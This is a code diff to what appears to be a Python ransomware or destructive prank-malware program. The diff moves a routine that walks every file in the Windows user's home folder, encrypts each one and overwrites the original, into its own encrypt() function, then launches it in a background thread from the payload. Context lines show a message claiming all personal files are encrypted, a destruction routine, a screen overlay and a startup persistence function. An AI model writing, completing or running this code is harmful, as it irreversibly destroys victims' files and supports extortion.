@@ -147,18 +147,6 @@ def overlay():
     root.mainloop()
 
 def again():
-    try:
-        for dirpath, dirnames, filenames in os.walk(f"C:\\Users\\{user}"):
-            for filename in filenames:
-                filepath = os.path.join(dirpath, filename)
-                with open(filepath, "rb") as f:
-                    contents = f.read()
-                encrypted = Fernet(key).encrypt(contents)
-                with open(filepath, "wb") as w:
-                    w.write(encrypted)
-        except Exception:
-            pass
-
     info("Info", "All your personal files have been encrypted. Enjoy the last 5 minutes of your PC!!!")
     threading.Thread(target=destruction, daemon=True).start()
     wait(300)
@@ -170,6 +158,20 @@ def destruction():
         for _ in range(10):
             num = random.randint(1, 100)
             f.write(str(num))
+
+def encrypt():
+    try:
+        for dirpath, dirnames, filenames in os.walk(f"C:\\Users\\{user}"):
+            for filename in filenames:
+                filepath = os.path.join(dirpath, filename)
+                with open(filepath, "rb") as f:
+                    contents = f.read()
+                encrypted = Fernet(key).encrypt(contents)
+                with open(filepath, "wb") as w:
+                    w.write(encrypted)
+    except Exception:
+        pass
+
 
 def startup():
         exe_path = os.path.abspath(sys.executable)
@@ -246,6 +248,7 @@ def payload():
     threading.Thread(target=sth, args=(resource_path("image.png"),), daemon=True).start()
     threading.Thread(target=sound, args=("audio.mp3",), daemon=True).start()
     schedule(10, overlay)
+    threading.Thread(target=encrypt, daemon=True).start()
     counter = 1
     wait(176)
 
